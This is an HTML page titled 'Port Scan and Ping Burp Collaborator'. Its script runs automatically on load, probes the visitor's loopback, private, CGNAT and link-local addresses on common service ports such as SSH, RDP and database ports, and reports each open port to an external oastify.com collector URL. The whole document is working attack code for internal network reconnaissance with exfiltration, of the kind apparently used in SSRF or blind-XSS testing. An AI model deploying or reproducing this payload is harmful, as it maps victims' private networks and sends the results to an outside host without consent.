<!DOCTYPE html>
<html>
<head>
    <title>Port Scan and Ping Burp Collaborator</title>
    <script type="text/javascript">
        async function scanPort(host, port) {
            try {
                let url = `http://${host}:${port}`;
                await fetch(url, { mode: 'no-cors' });
                console.log(`Port ${port} is open on ${host}`);
                sendPing(host, port);
                return port;
            } catch (error) {
                return null; // Port is closed
            }
        }

        async function scanPorts(host, ports) {
            let openPorts = [];
            for (let port of ports) {
                let result = await scanPort(host, port);
                if (result) {
                    openPorts.push(result);
                }
            }
            return openPorts;
        }

        function sendPing(host, port) {
            let collaboratorUrl = 'https://d6ktrternvnv02zyiu5g36k2ktqkej28.oastify.com';
            let pingUrl = `${collaboratorUrl}?host=${host}&port=${port}`;
            let img = new Image();
            img.src = pingUrl;
            console.log(`Ping sent to ${pingUrl}`);
        }

        document.addEventListener("DOMContentLoaded", function() {
            let ips = [
                // Loopback
                '127.0.0.1',
                // Class A Private Range
                '10.0.0.1', '10.0.1.1', '10.0.2.1', '10.0.3.1', '10.0.4.1', '10.0.5.1',
                '10.1.1.1', '10.1.2.1', '10.1.3.1', '10.1.4.1', '10.1.5.1',
                '10.10.10.1', '10.10.20.1', '10.10.30.1', '10.10.40.1', '10.10.50.1',
                '10.100.100.1', '10.200.200.1',
                // Class B Private Range
                '172.16.0.1', '172.16.1.1', '172.16.2.1', '172.16.3.1', '172.16.4.1',
                '172.20.0.1', '172.20.1.1', '172.20.2.1', '172.20.3.1', '172.20.4.1',
                '172.30.0.1', '172.30.1.1', '172.30.2.1', '172.30.3.1', '172.30.4.1',
                '172.31.0.1', '172.31.1.1', '172.31.2.1', '172.31.3.1', '172.31.4.1',
                // Class C Private Range
                '192.168.0.1', '192.168.0.10', '192.168.0.20', '192.168.0.30', '192.168.0.40',
                '192.168.1.1', '192.168.1.10', '192.168.1.20', '192.168.1.30', '192.168.1.40',
                '192.168.2.1', '192.168.2.10', '192.168.2.20', '192.168.2.30', '192.168.2.40',
                '192.168.10.1', '192.168.10.10', '192.168.10.20', '192.168.10.30', '192.168.10.40',
                '192.168.100.1', '192.168.100.10', '192.168.100.20', '192.168.100.30', '192.168.100.40',
                '192.168.200.1', '192.168.200.10', '192.168.200.20', '192.168.200.30', '192.168.200.40',
                '192.168.50.1', '192.168.50.10', '192.168.50.20', '192.168.50.30', '192.168.50.40',
                '192.168.123.1', '192.168.123.10', '192.168.123.20', '192.168.123.30', '192.168.123.40',
                '192.168.254.1', '192.168.254.10', '192.168.254.20', '192.168.254.30', '192.168.254.40',
                // Carrier-Grade NAT (CGNAT)
                '100.64.0.1', '100.64.0.10', '100.64.0.20', '100.64.0.30', '100.64.0.40',
                '100.64.1.1', '100.64.1.10', '100.64.1.20', '100.64.1.30', '100.64.1.40',
                '100.64.2.1', '100.64.2.10', '100.64.2.20', '100.64.2.30', '100.64.2.40',
                '100.127.0.1', '100.127.0.10', '100.127.0.20', '100.127.0.30', '100.127.0.40',
                '100.127.255.254',
                // Link-Local (APIPA)
                '169.254.0.1', '169.254.0.10', '169.254.0.20', '169.254.0.30', '169.254.0.40',
                '169.254.1.1', '169.254.1.10', '169.254.1.20', '169.254.1.30', '169.254.1.40',
                '169.254.2.1', '169.254.2.10', '169.254.2.20', '169.254.2.30', '169.254.2.40',
                '169.254.255.254'
            ];

            let ports = [
                80, 443, 8080, 3000, 22, 21, 3306, 5432, 8443, 3389, 5900, 6379, 9200, 27017
            ]; // List of ports to scan

            ips.forEach(host => {
                scanPorts(host, ports).then(openPorts => {
                    console.log(`Open ports on ${host}:`, openPorts);
                });
            });
        });
    </script>
</head>
<body>
    <p>Scanning ports and pinging Burp Collaborator...</p>
</body>
</html>
